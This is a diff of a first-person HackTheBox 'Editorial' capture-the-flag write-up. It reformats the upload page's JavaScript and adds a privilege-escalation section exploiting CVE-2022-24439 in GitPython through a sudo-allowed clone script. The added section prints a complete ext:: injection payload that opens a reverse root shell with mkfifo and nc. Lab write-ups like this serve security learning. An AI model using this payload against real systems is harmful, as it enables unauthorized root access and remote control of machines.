@@ -20,26 +20,26 @@ PORT   STATE SERVICE VERSION
 As the webserver seemed like the better initial target, I opened up Burp Suite alongside firefox and began seeing what it would have for us. Due to an initial error when accessing the webserver over just the IP, I first added `editorial.htb` into my /etc/hosts file, allowing us to access the site.
 
 While poking around the website, I ran a number of directory and file brute forcing lists using `ffuf`, but none of these turned up anything useful. On the website itself, I was immediately drawn to the `/upload` page which gave us two extremely interesting options— submit a URL or upload a file. I then further looked at the page source, noting an interesting script related to this functionality:
-```
-        <script>
-          document.getElementById('button-cover').addEventListener('click', function(e) {
-            e.preventDefault();
-            var formData = new FormData(document.getElementById('form-cover'));
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/upload-cover');
-            xhr.onload = function() {
-              if (xhr.status === 200) {
-                var imgUrl = xhr.responseText;
-                console.log(imgUrl);
-                document.getElementById('bookcover').src = imgUrl;
+```javascript
+<script>
+  document.getElementById('button-cover').addEventListener('click', function(e) {
+    e.preventDefault();
+    var formData = new FormData(document.getElementById('form-cover'));
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/upload-cover');
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        var imgUrl = xhr.responseText;
+        console.log(imgUrl);
+        document.getElementById('bookcover').src = imgUrl;
 
-                document.getElementById('bookfile').value = '';
-                document.getElementById('bookurl').value = '';
-              }
-            };
-            xhr.send(formData);
-          });
-        </script>
+        document.getElementById('bookfile').value = '';
+        document.getElementById('bookurl').value = '';
+      }
+    };
+    xhr.send(formData);
+  });
+</script>
 ```
 
 Taking note that this script was printing the uploaded file path to the console as well initiating the request upon clicking "Preview", this sent me looking for a file upload vulnerability. Interestingly, this app makes great use a best practice in mitigating file upload vulnerabilities— it is changing the filename to a long, random ID upon upload. This however is obviously counteracted by the fact that it then displays the path and new name directly to the user in the web console.
@@ -143,4 +143,29 @@ As expected, this revealed credentials for the `prod` user account.
 I then used SSH to log into the `prod` account. I did some initial checks again, and quickly found that this account has access to single command with root privileges via `sudo -l`.
 We are able to run: `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *`
 
-The use of absolute paths here is good, so I 
+The use of absolute paths here is stronger for security than relative paths, so I decided to first inspect this python file and see what it is doing.
+```python
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+It looks like this code is using python to clone a git reposity from a remote location of our choosing to the 'new_changes' directory. Without knowing much about this function, the `-c protocol.ext.allow=always' looks a bit odd, and potentially insecure. I threw that string into Google to see what would turn up. This brought me to a page for CVE-2022-24439, a vulnerability in GitPython, conveniently when the 'ext' transport protocol is allowed.
+
+Initially, I found another page that had an example of how to exploit this vulnerability [here](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858). However, since I didn't actually understand the syntax necessary to make it work, I wasted a bit of time trying to open a root shell.
+
+Finally (as I should have done initially) I opened the [git-remote-ext documentation](https://git-scm.com/docs/git-remote-ext) and immediately found that % was used to input a literal space into the arguments. After this, I opened a reverse root shell with the following command.
+```sh
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c mkfifo% /tmp/f;% nc% <IP>% <PORT>% <% /tmp/f% |% /bin/sh% >/tmp/f% 2>&1;% rm% /tmp/f"
+```
+
+Then I made my way to the `/root` directory and grabbed root.txt.
